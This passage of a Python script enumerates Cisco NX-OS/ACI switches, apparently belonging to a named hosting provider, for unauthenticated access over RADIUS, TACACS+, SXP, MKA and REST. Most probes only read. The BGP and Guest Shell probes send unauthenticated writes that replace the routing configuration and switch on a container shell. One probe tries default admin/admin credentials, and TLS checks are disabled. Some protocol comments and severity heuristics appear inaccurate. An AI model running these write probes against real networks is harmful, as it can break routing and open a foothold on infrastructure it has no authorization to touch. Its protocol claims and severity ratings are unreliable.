    attrs += bytes([2, 2 + len(password_enc)]) + password_enc
    # NAS-IP-Address (attr 4) = 0.0.0.0
    attrs += bytes([4, 6, 0, 0, 0, 0])
    # NAS-Port (attr 5) = 0
    attrs += bytes([5, 6, 0, 0, 0, 0])

    import struct
    length = 20 + len(attrs)
    # code=1 Access-Request, id=1
    pkt = struct.pack("!BBH", 1, 1, length) + authenticator + attrs

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(pkt, (host, port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        if data and len(data) >= 4:
            code = data[0]
            if code == 2:  # Access-Accept
                finding["severity"] = "CRITICAL"
                finding["title"] = "RADIUS accepting NAS from unvalidated source"
                finding["detail"] = "Server returned Access-Accept for unauthenticated NAS; no NAS-IP/key validation"
            elif code == 3:  # Access-Reject — server is live but rejecting
                finding["severity"] = "LOW"
                finding["title"] = "RADIUS port open"
                finding["detail"] = f"Access-Reject received; server live on UDP/{port}"
            else:
                finding["severity"] = "LOW"
                finding["title"] = "RADIUS port open"
                finding["detail"] = f"Response code {code} received on UDP/{port}"
    except (socket.timeout, OSError):
        pass

    # Secondary: APIC REST endpoint for RADIUS provider list (unauth)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            f"https://{host}:443/api/v1/aaa/radiusProviders",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body = resp.read(4096)
        if resp.status == 200 and body:
            finding["severity"] = "HIGH"
            finding["title"] = "RADIUS provider list readable unauthenticated"
            finding["detail"] = f"GET /api/v1/aaa/radiusProviders returned 200 unauthenticated; {len(body)} bytes"
            finding["port"] = 443
    except (urllib.error.URLError, OSError):
        pass

    return finding


def probe_tacacs_cleartext(host: str, port: int = 49, timeout: float = 3.0) -> dict:
    """Probe TCP/49 for TACACS+ exposure and unencrypted session flags."""
    finding = {
        "severity": "INFO",
        "title": "TACACS+ probe",
        "detail": "No TACACS+ exposure detected",
        "host": host,
        "port": port,
    }

    import struct, os
    # TACACS+ header: ver(1) type(1) seq_no(1) flags(1) session_id(4) length(4)
    # Authentication START body: action=login(1) priv_lvl=0 authen_type=ascii(1)
    # service=login(1) user_len=4 port_len=0 rem_addr_len=0 data_len=0 user="test"
    body = bytes([
        1,    # action = TAC_PLUS_AUTHEN_LOGIN
        0,    # priv_lvl
        1,    # authen_type = ASCII
        1,    # service = LOGIN
        4,    # user_len
        0,    # port_len
        0,    # rem_addr_len
        0,    # data_len
    ]) + b"test"
    session_id = os.urandom(4)
    # flags=0x00: unencrypted (TAC_PLUS_UNENCRYPTED_FLAG not set; 0x04=single-connect)
    header = bytes([0xc1, 1, 1, 0x00]) + session_id + struct.pack("!I", len(body))
    pkt = header + body

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(pkt)
        data = sock.recv(4096)
        sock.close()
        if data and len(data) >= 12:
            resp_flags = data[3]
            if resp_flags & 0x04:
                finding["severity"] = "HIGH"
                finding["title"] = "TACACS+ single-connect mode detected"
                finding["detail"] = (
                    "Response flags=0x{:02x}; TAC_PLUS_SINGLE_CONNECT_FLAG set — "
                    "session multiplexing without per-session re-keying".format(resp_flags)
                )
            else:
                finding["severity"] = "LOW"
                finding["title"] = "TACACS+ port open"
                finding["detail"] = f"TACACS+ server responded on TCP/{port}; flags=0x{resp_flags:02x}"
        elif data:
            finding["severity"] = "LOW"
            finding["title"] = "TACACS+ port open"
            finding["detail"] = f"TCP/{port} responded with {len(data)} bytes"
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    return finding


def probe_trustsec_sgt(
    host: str,
    username: str = "admin",
    password: str = "admin",
    timeout: float = 5.0,
) -> dict:
    """Probe TrustSec SGT policy for unclassified-traffic exposure and unauth env-data."""
    finding = {
        "severity": "INFO",
        "title": "TrustSec SGT probe",
        "detail": "No TrustSec SGT exposure detected",
        "host": host,
        "port": 443,
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Unauthenticated environment-data endpoint — present on NX-OS and ISE
    try:
        req = urllib.request.Request(
            f"https://{host}:443/api/v1/cts/environment-data",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body = resp.read(8192)
        if resp.status == 200 and body:
            finding["severity"] = "HIGH"
            finding["title"] = "TrustSec environment-data readable unauthenticated"
            finding["detail"] = f"GET /api/v1/cts/environment-data returned 200; {len(body)} bytes"
            return finding
    except (urllib.error.URLError, OSError):
        pass

    # Authenticated SGT policy check — SGT 0 in any policy = unclassified traffic permitted
    try:
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        req = urllib.request.Request(
            f"https://{host}:443/api/v1/cisco-system:cisco-sdwan/cts/sgt",
            headers={"Accept": "application/json", "Authorization": f"Basic {creds}"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body = resp.read(16384)
        if resp.status == 200 and body:
            body_str = body.decode("utf-8", errors="replace")
            # SGT 0 = unclassified; presence in policy = traffic bypass risk
            if '"sgt": 0' in body_str or '"sgt":0' in body_str or '"tag": 0' in body_str:
                finding["severity"] = "MEDIUM"
                finding["title"] = "TrustSec SGT-0 unclassified traffic in policy"
                finding["detail"] = "SGT 0 (unclassified) appears in active TrustSec policy; untagged traffic may bypass enforcement"
            elif resp.status == 200:
                finding["severity"] = "INFO"
                finding["title"] = "TrustSec SGT policy readable"
                finding["detail"] = f"Authenticated SGT policy returned {len(body)} bytes; no SGT-0 match"
    except (urllib.error.URLError, OSError):
        pass

    return finding


def probe_copp_policy(host: str, port: int = 443, timeout: float = 5.0) -> dict:
    """Probe APIC for unauthenticated CoPP policy read and default-unchanged detection."""
    finding = {
        "severity": "INFO",
        "title": "CoPP policy probe",
        "detail": "No CoPP exposure detected",
        "host": host,
        "port": port,
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base_path = f"https://{host}:{port}/api/v1/policyuniverse/infra/BestPract/copp"
    try:
        req = urllib.request.Request(
            base_path,
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body = resp.read(8192)
        if resp.status == 200 and body:
            finding["severity"] = "MEDIUM"
            finding["title"] = "CoPP policy readable unauthenticated"
            finding["detail"] = f"GET /api/v1/policyuniverse/infra/BestPract/copp returned 200; {len(body)} bytes"
    except (urllib.error.URLError, OSError):
        pass

    # Default CoPP rule check — unchanged default = known rate-limit values
    try:
        req2 = urllib.request.Request(
            base_path + "/ruleP-copp-default",
            headers={"Accept": "application/json"},
        )
        resp2 = urllib.request.urlopen(req2, context=ctx, timeout=timeout)
        body2 = resp2.read(8192)
        if resp2.status == 200 and body2:
            body_str = body2.decode("utf-8", errors="replace")
            # Cisco ships copp-default with well-known rate values; any 200 here is significant
            finding["severity"] = "HIGH"
            finding["title"] = "Default CoPP policy unchanged and readable unauthenticated"
            finding["detail"] = (
                "GET /api/v1/policyuniverse/infra/BestPract/copp/ruleP-copp-default "
                f"returned 200; default rate-limits likely in effect ({len(body2)} bytes)"
            )
    except (urllib.error.URLError, OSError):
        pass

    return finding


def probe_port_security_bypass(host: str, port: int = 443, timeout: float = 5.0) -> dict:
    """Probe APIC for unauthenticated SVI/port-security topology exposure."""
    finding = {
        "severity": "INFO",
        "title": "Port security bypass probe",
        "detail": "No port security exposure detected",
        "host": host,
        "port": port,
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Unauthenticated SVI topology read — leaks VLAN/port binding useful for MAC spoofing
    endpoints = [
        "/api/v1/topology/pod-1/node-101/local/svi",
        "/api/v1/node/mo/uni/l1Dom",
    ]
    for ep in endpoints:
        try:
            req = urllib.request.Request(
                f"https://{host}:{port}{ep}",
                headers={"Accept": "application/json"},
            )
            resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            body = resp.read(8192)
            if resp.status == 200 and body:
                finding["severity"] = "MEDIUM"
                finding["title"] = "APIC SVI/L1-domain topology readable unauthenticated"
                finding["detail"] = (
                    f"GET {ep} returned 200 unauthenticated; VLAN-to-port bindings exposed "
                    f"({len(body)} bytes) — enables MAC table mapping for port-security bypass"
                )
                finding["port"] = port
                break
        except (urllib.error.URLError, OSError):
            continue

    return finding


def probe_sxp_service(host: str, port: int = 64999, timeout: float = 5.0) -> dict:
    """Probe SXP (SGT Exchange Protocol) attack surface on TCP/64999."""
    finding = {
        "severity": "INFO",
        "title": "SXP service probe",
        "detail": "No SXP exposure detected",
        "host": host,
        "port": port,
    }

    import struct
    import os

    # SXP Open message: 8-byte header + 16-byte Open payload
    # Header: length(4)=24, type(2)=0x0001, error_code(2)=0x0000
    # Open payload: version(2)=0x0002, node_id(4)=random, pad(10)
    node_id = os.urandom(4)
    header = struct.pack("!IHHH", 24, 0x0001, 0x0000, 0x0002)
    payload = node_id + b"\x00" * 10
    sxp_open = header + payload

    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(sxp_open)
            try:
                response = sock.recv(4096)
            except socket.timeout:
                response = b""

            if response:
                finding["severity"] = "HIGH"
                finding["title"] = "SXP_SERVICE_ACTIVE"
                finding["detail"] = (
                    "SXP peer responded on TCP/64999 without peer authentication; "
                    "SGT mapping table may be readable by any node on the network "
                    f"({len(response)} bytes received)"
                )

                # Check for SGT-IP attribute type 0x0003 in response
                if b"\x00\x03" in response:
                    finding["severity"] = "CRITICAL"
                    finding["title"] = "SXP_SGT_MAPPINGS_DISCLOSED"
                    finding["detail"] = (
                        "SXP response contains SGT-IP attribute (type 0x0003); "
                        "SGT-to-IP mappings disclosed without peer authentication — "
                        "attacker can enumerate TrustSec policy enforcement boundaries "
                        f"({len(response)} bytes received)"
                    )
    except (OSError, socket.error):
        pass

    return finding


def probe_mka_macsec(host: str, port: int = 8008, timeout: float = 3.0) -> list:
    """Probe MKA/MACsec key agreement attack surface (UDP/8008 OOB + APIC API)."""
    findings = []

    import struct
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # UDP/8008: NX-OS MKA out-of-band channel
    # Minimal EAPOL-MKA frame: EtherType 0x888E, type=5 (EAPOL-MKA), body_length=96
    eapol_mka = struct.pack("!BBHB95x", 0x01, 0x05, 96, 0x00)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_sock:
            udp_sock.settimeout(timeout)
            udp_sock.sendto(eapol_mka, (host, port))
            try:
                data, _ = udp_sock.recvfrom(4096)
                if data:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "MKA_OOB_PORT_ACTIVE",
                        "detail": (
                            f"UDP/{port} responded to EAPOL-MKA probe; "
                            "NX-OS MKA out-of-band port active — "
                            "key agreement channel reachable from untrusted segment "
                            f"({len(data)} bytes received)"
                        ),
                        "host": host,
                        "port": port,
                    })
            except socket.timeout:
                pass
    except OSError:
        pass

    # APIC unauthenticated MACsec config read
    apic_port = 443
    macsec_endpoints = [
        ("/api/v1/node/mo/sys/macsec", "MACSEC_CONFIG_READABLE_UNAUTH",
         "HIGH", "MACsec configuration readable unauthenticated via APIC"),
        ("/api/v1/node/mo/sys/cts/inst", "TRUSTSEC_INSTANCE_READABLE_UNAUTH",
         "HIGH", "TrustSec instance configuration readable unauthenticated via APIC"),
    ]
    for ep, title, severity, label in macsec_endpoints:
        try:
            req = urllib.request.Request(
                f"https://{host}:{apic_port}{ep}",
                headers={"Accept": "application/json"},
            )
            resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            body = resp.read(8192)
            if resp.status == 200 and body:
                findings.append({
                    "severity": severity,
                    "title": title,
                    "detail": (
                        f"GET {ep} returned 200 unauthenticated; "
                        f"{label} ({len(body)} bytes) — "
                        "exposes key lifetime, cipher suite, and session bindings"
                    ),
                    "host": host,
                    "port": apic_port,
                })
        except (urllib.error.URLError, OSError):
            continue

    return findings


def probe_802_1x_bypass(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Probe 802.1X/MAB bypass attack surface via APIC unauthenticated reads."""
    findings = []

    import ssl
    import json

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Auth profile readable unauthenticated
    try:
        req = urllib.request.Request(
            f"https://{host}:{port}/api/v1/node/mo/sys/authp",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body = resp.read(8192)
        if resp.status == 200 and body:
            findings.append({
                "severity": "HIGH",
                "title": "DOT1X_AUTH_PROFILE_READABLE_UNAUTH",
                "detail": (
                    "GET /api/v1/node/mo/sys/authp returned 200 unauthenticated; "
                    "802.1X authentication profile exposed — "
                    f"reveals dot1x timers, method order, and guest VLAN config ({len(body)} bytes)"
                ),
                "host": host,
                "port": port,
            })
    except (urllib.error.URLError, OSError):
        pass

    # MAB entries + auth-fail VLAN check
    try:
        req = urllib.request.Request(
            f"https://{host}:{port}/api/v1/node/class/l2AuthCfg.json",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body_bytes = resp.read(16384)
        if resp.status == 200 and body_bytes:
            try:
                data = json.loads(body_bytes)
                objects = data.get("imdata", [])
                mab_found = False
                auth_fail_vlan_absent = True
                for obj in objects:
                    attrs = obj.get("l2AuthCfg", {}).get("attributes", {})
                    if attrs.get("mab", "").lower() in ("enabled", "yes", "true"):
                        mab_found = True
                    if attrs.get("authFailVlan") or attrs.get("failVlan"):
                        auth_fail_vlan_absent = False

                if mab_found:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "MAB_ENABLED",
                        "detail": (
                            "MAC Authentication Bypass enabled on one or more ports; "
                            "MAC spoofing circumvents 802.1X enforcement — "
                            "attacker with a known MAC address bypasses port authentication"
                        ),
                        "host": host,
                        "port": port,
                    })
                if auth_fail_vlan_absent:
                    findings.append({
                        "severity": "HIGH",
                        "title": "NO_AUTH_FAIL_VLAN",
                        "detail": (
                            "No authFail VLAN configured in l2AuthCfg; "
                            "802.1X authentication failure permits open network access — "
                            "failed supplicants land on the default VLAN uncontrolled"
                        ),
                        "host": host,
                        "port": port,
                    })
            except (ValueError, KeyError):
                pass
    except (urllib.error.URLError, OSError):
        pass

    # Anycast/untagged endpoint groups
    try:
        req = urllib.request.Request(
            f"https://{host}:{port}/api/v1/node/class/fvAEPg.json",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body_bytes = resp.read(16384)
        if resp.status == 200 and body_bytes:
            try:
                data = json.loads(body_bytes)
                objects = data.get("imdata", [])
                untagged = [
                    obj for obj in objects
                    if obj.get("fvAEPg", {}).get("attributes", {}).get("floodOnEncap") == "enabled"
                    or obj.get("fvAEPg", {}).get("attributes", {}).get("pcEnfPref") == "unenforced"
                ]
                if untagged:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "UNTAGGED_ENDPOINTS_PRESENT",
                        "detail": (
                            f"{len(untagged)} EPG(s) with untagged/anycast forwarding or "
                            "unenforced policy contracts detected; "
                            "traffic from these segments bypasses TrustSec classification"
                        ),
                        "host": host,
                        "port": port,
                    })
            except (ValueError, KeyError):
                pass
    except (urllib.error.URLError, OSError):
        pass

    return findings


def probe_trustsec_policy_bypass(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Probe TrustSec policy bypass attack surface via unauthenticated APIC/CTS reads."""
    findings = []

    import ssl
    import json

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Best-practice policy universe readable without auth
    try:
        req = urllib.request.Request(
            f"https://{host}:{port}/api/v1/policyuniverse/infra/BestPract",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body = resp.read(8192)
        if resp.status == 200 and body:
            findings.append({
                "severity": "MEDIUM",
                "title": "TRUSTSEC_POLICY_UNIVERSE_READABLE_UNAUTH",
                "detail": (
                    "GET /api/v1/policyuniverse/infra/BestPract returned 200 unauthenticated; "
                    "TrustSec policy universe readable — "
                    f"reveals enforcement posture and deviation from best-practice baseline ({len(body)} bytes)"
                ),
                "host": host,
                "port": port,
            })
    except (urllib.error.URLError, OSError):
        pass

    # SGT=0 (unclassified) policy check
    try:
        req = urllib.request.Request(
            f"https://{host}:{port}/api/v1/cts/policies/unknownSgt",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body_bytes = resp.read(8192)
        if resp.status == 200 and body_bytes:
            try:
                data = json.loads(body_bytes)
                raw = json.dumps(data).lower()
                if "permit" in raw and ("any" in raw or "all" in raw):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "UNCLASSIFIED_SGT_PERMIT_ALL",
                        "detail": (
                            "SGT=0 (unclassified traffic) policy contains PERMIT-ANY; "
                            "untagged lateral movement is unrestricted within the TrustSec domain — "
                            "attacker without a valid SGT traverses all policy boundaries"
                        ),
                        "host": host,
                        "port": port,
                    })
            except (ValueError, KeyError):
                pass
    except (urllib.error.URLError, OSError):
        pass

    # Local SGT value disclosed unauthenticated
    try:
        req = urllib.request.Request(
            f"https://{host}:{port}/api/v1/cts/environment-data/localSgt",
            headers={"Accept": "application/json"},
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
        body_bytes = resp.read(8192)
        if resp.status == 200 and body_bytes:
            findings.append({
                "severity": "HIGH",
                "title": "LOCAL_SGT_DISCLOSED",
                "detail": (
                    "GET /api/v1/cts/environment-data/localSgt returned 200 unauthenticated; "
                    "local SGT value exposed — "
                    "attacker can forge packets with the device SGT to impersonate trusted infrastructure "
                    f"({len(body_bytes)} bytes)"
                ),
                "host": host,
                "port": port,
            })
    except (urllib.error.URLError, OSError):
        pass

    # Wildcard TrustSec policy (source ANY, dest ANY)
    wildcard_endpoints = [
        "/api/v1/cts/policies",
        "/api/v1/node/class/ctsSgtPolicy.json",
    ]
    for ep in wildcard_endpoints:
        try:
            req = urllib.request.Request(
                f"https://{host}:{port}{ep}",
                headers={"Accept": "application/json"},
            )
            resp = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            body_bytes = resp.read(16384)
            if resp.status == 200 and body_bytes:
                try:
                    data = json.loads(body_bytes)
                    raw = json.dumps(data).lower()
                    # Wildcard indicators: srcSgt=0+dstSgt=0, or "any"+"permit" combos
                    has_wildcard = (
                        ('"srcsgt": 0' in raw or '"srcsgt":"0"' in raw or "srcsgt=0" in raw)
                        and ('"dstsgt": 0' in raw or '"dstsgt":"0"' in raw or "dstsgt=0" in raw)
                        and "permit" in raw
                    ) or ("any" in raw and "any" in raw and "permit" in raw and "policy" in raw)
                    if has_wildcard:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "WILDCARD_TRUSTSEC_POLICY",
                            "detail": (
                                f"Wildcard TrustSec policy detected via {ep} "
                                "(source ANY, destination ANY, action PERMIT); "
                                "microsegmentation enforcement is globally bypassed — "
                                "all SGT-based lateral movement controls are ineffective"
                            ),
                            "host": host,
                            "port": port,
                        })
                        break
                except (ValueError, KeyError):
                    pass
        except (urllib.error.URLError, OSError):
            continue

    return findings


def enumerate_macstadium_cisco() -> dict:
    """Top-level: enumerate all MacStadium Cisco NX-OS / ACI targets."""
    enumerator = NXOSEnumerator(targets=MACSTADIUM_CISCO_TARGETS)
    return enumerator.run()


def probe_nxos_nxapi_rest(host: str, port: int = 80, timeout: float = 5.0) -> list:
    """Probe NX-OS NX-API REST (DME) endpoints for unauthenticated access.

    Targets the DME (Data Model Engine) object model exposed via HTTP/HTTPS REST.
    URL pattern: /api/mo/<DN>.json  Distinguished Names map to device state trees.
    Auth normally requires an APIC-Cookie from POST /api/aaaLogin.json; absence of
    that gate on any of these endpoints is the finding.

    Args:
        host: Target IP or hostname.
        port: HTTP port (default 80); HTTPS on 443 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(url: str, use_ssl: bool, p: int) -> tuple:
        """Return (status, body_bytes) or (None, None) on error."""
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx) if use_ssl
                else urllib.request.HTTPHandler()
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(65536)
        except (urllib.error.URLError, OSError):
            return None, None

    def _check_dme_ok(body_bytes: bytes) -> bool:
        """Return True if body looks like a successful DME response."""
        if not body_bytes:
            return False
        try:
            data = json.loads(body_bytes)
            # DME wraps responses in {"totalCount":"N","imdata":[...]}
            # or {"status":"OK"} on some NX-OS builds
            raw = json.dumps(data).lower()
            return (
                "imdata" in data
                or "totalcount" in raw
                or '"status": "ok"' in raw
                or '"status":"ok"' in raw
            )
        except (ValueError, KeyError):
            return False

    for use_ssl, p in [(False, port), (True, 443)]:
        scheme = "https" if use_ssl else "http"
        base = f"{scheme}://{host}:{p}"

        # --- DME root object (sys) ---
        status, body = _get(f"{base}/api/mo/sys.json", use_ssl, p)
        if status == 200 and _check_dme_ok(body):
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_DME_UNAUTH",
                "detail": (
                    f"GET /api/mo/sys.json returned 200 unauthenticated on {scheme}:{p}; "
                    "NX-OS DME root object accessible — full device model tree readable "
                    "without credentials. Exposes hostname, platform, NX-OS version, "
                    f"feature state, and all child MOs ({len(body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

        # --- BGP configuration ---
        status, body = _get(f"{base}/api/mo/sys/bgp.json", use_ssl, p)
        if status == 200 and _check_dme_ok(body):
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_BGP_CONFIG_UNAUTH",
                "detail": (
                    f"GET /api/mo/sys/bgp.json returned 200 unauthenticated on {scheme}:{p}; "
                    "BGP configuration data readable — AS number, router-ID, peer addresses, "
                    f"and VRF-level BGP policy accessible without auth ({len(body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

        # --- Interface table ---
        status, body = _get(f"{base}/api/mo/sys/intf.json", use_ssl, p)
        if status == 200 and _check_dme_ok(body):
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_INTERFACE_TABLE_UNAUTH",
                "detail": (
                    f"GET /api/mo/sys/intf.json returned 200 unauthenticated on {scheme}:{p}; "
                    "full interface table exposed — port names, IP addresses, admin/oper state, "
                    f"and Layer 2/3 config readable without credentials ({len(body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

        # --- L3 external connectivity ---
        status, body = _get(f"{base}/api/class/l3extOut.json", use_ssl, p)
        if status == 200 and _check_dme_ok(body):
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_L3_EXTERNAL_UNAUTH",
                "detail": (
                    f"GET /api/class/l3extOut.json returned 200 unauthenticated on {scheme}:{p}; "
                    "L3 external connectivity objects exposed — external routing domains, "
                    f"peering config, and fabric exit points readable without auth ({len(body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

        # --- Config write: PUT-style BGP replacement ---
        # NX-OS DME: PUT at feature MO level with a complete valid config replaces that subtree.
        # A 200 response here means unauthenticated config write is possible.
        bgp_payload = json.dumps({
            "bgpInst": {
                "attributes": {
                    "asn": "65001",
                    "rn": "inst",
                },
                "children": [
                    {
                        "bgpDom": {
                            "attributes": {
                                "name": "default",
                                "rn": "dom-default",
                                "rtrId": "192.0.2.1",
                            }
                        }
                    }
                ],
            }
        }).encode()
        try:
            req = urllib.request.Request(
                f"{base}/api/mo/sys/bgp.json",
                data=bgp_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                method="POST",
            )
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx) if use_ssl
                else urllib.request.HTTPHandler()
            )
            resp = opener.open(req, timeout=timeout)
            write_status = resp.status
            write_body = resp.read(4096)
        except (urllib.error.URLError, OSError):
            write_status = None
            write_body = b""

        if write_status == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_CONFIG_WRITE_UNAUTH",
                "detail": (
                    f"POST /api/mo/sys/bgp.json (PUT-style BGP replacement) returned 200 "
                    f"unauthenticated on {scheme}:{p}; NX-OS DME accepted a config write "
                    "without credentials — attacker can replace BGP configuration, inject "
                    f"arbitrary AS/peer/policy, or disrupt routing convergence ({len(write_body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

    return findings


def probe_nxos_guestshell(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Probe NX-OS NX-API REST endpoints for Guest Shell / virtual service exposure.

    Guest Shell is an LXC container (virtual service 'guestshell+') on the NX-OS host.
    Accessible from NX-OS CLI with no username/password required. If the NX-API REST
    interface is unauthenticated, an attacker can read or enable Guest Shell remotely,
    gaining a persistent container with Python and arbitrary package execution on the
    switch management plane.

    Args:
        host: Target IP or hostname.
        port: HTTPS port (default 443); HTTP on 80 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(url: str, use_ssl: bool) -> tuple:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx) if use_ssl
                else urllib.request.HTTPHandler()
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(65536)
        except (urllib.error.URLError, OSError):
            return None, None

    def _dme_has_data(body_bytes: bytes) -> bool:
        if not body_bytes:
            return False
        try:
            data = json.loads(body_bytes)
            raw = json.dumps(data).lower()
            return "imdata" in data or "totalcount" in raw
        except (ValueError, KeyError):
            return False

    for use_ssl, p in [(True, port), (False, 80)]:
        scheme = "https" if use_ssl else "http"
        base = f"{scheme}://{host}:{p}"

        # --- Guest Shell virtual service state ---
        status, body = _get(f"{base}/api/mo/sys/guestshell.json", use_ssl)
        if status == 200 and _dme_has_data(body):
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_GUESTSHELL_STATE_EXPOSED",
                "detail": (
                    f"GET /api/mo/sys/guestshell.json returned 200 unauthenticated on {scheme}:{p}; "
                    "Guest Shell (LXC container) state readable — operational status, "
                    "resource allocation (cpu/memory/disk), and activation mode exposed "
                    f"without credentials ({len(body)} bytes). "
                    "Guest Shell provides no-password shell access from NX-OS CLI."
                ),
                "host": host,
                "port": p,
            })

        # --- Unauthenticated Guest Shell enable ---
        enable_payload = json.dumps({
            "guestshell": {
                "attributes": {
                    "state": "enabled",
                }
            }
        }).encode()
        try:
            req = urllib.request.Request(
                f"{base}/api/mo/sys/action/guestshell.json",
                data=enable_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                method="POST",
            )
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx) if use_ssl
                else urllib.request.HTTPHandler()
            )
            resp = opener.open(req, timeout=timeout)
            en_status = resp.status
            en_body = resp.read(4096)
        except (urllib.error.URLError, OSError):
            en_status = None
            en_body = b""

        if en_status == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_GUESTSHELL_ENABLE_UNAUTH",
                "detail": (
                    f"POST /api/mo/sys/action/guestshell.json with state=enabled returned 200 "
                    f"unauthenticated on {scheme}:{p}; attacker can activate the Guest Shell "
                    "LXC container remotely without credentials — Guest Shell provides no-password "
                    "shell access on the NX-OS management plane with Python and arbitrary "
                    f"package execution capability ({len(en_body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

        # --- Guest Shell installed packages ---
        status, body = _get(f"{base}/api/mo/sys/guestshell/packages.json", use_ssl)
        if status == 200 and _dme_has_data(body):
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_GUESTSHELL_PACKAGES",
                "detail": (
                    f"GET /api/mo/sys/guestshell/packages.json returned 200 unauthenticated "
                    f"on {scheme}:{p}; Guest Shell installed package list readable — "
                    "exposes software inventory for version-targeted exploitation "
                    f"({len(body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

        # --- All virtual services ---
        status, body = _get(f"{base}/api/class/virtualService.json", use_ssl)
        if status == 200 and _dme_has_data(body):
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_VIRTUAL_SERVICES_UNAUTH",
                "detail": (
                    f"GET /api/class/virtualService.json returned 200 unauthenticated on {scheme}:{p}; "
                    "full virtual services list exposed — all installed virtual services (including "
                    "guestshell+, third-party containers) with state, resource allocation, "
                    f"and activation status readable without credentials ({len(body)} bytes)."
                ),
                "host": host,
                "port": p,
            })

    return findings


def probe_nxos_gnmi(host: str, port: int = 50051, timeout: float = 10.0) -> list:
    """Probe NX-OS gNMI/gRPC management interface.

    Checks port 50051 (default gNMI) and 9339 (alternate gNMI) for TCP
    reachability, then sends the HTTP/2 client preface to confirm gRPC
    service presence. NX-OS 9.3(x) exposes gNMI via the gRPC agent
    (Google Protobuf encoding); unauthenticated gRPC access grants full
    Get/Set/Subscribe over all YANG model paths.
    """
    import socket

    findings = []
    H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    gnmi_ports = [
        (50051, "NXOS_GNMI_PORT_OPEN", "HIGH",
         "TCP port 50051 (default gNMI gRPC management interface) is open on {h}:{p}; "
         "NX-OS 9.3(x) gRPC agent listens here and may accept gNMI Get/Set/Subscribe "
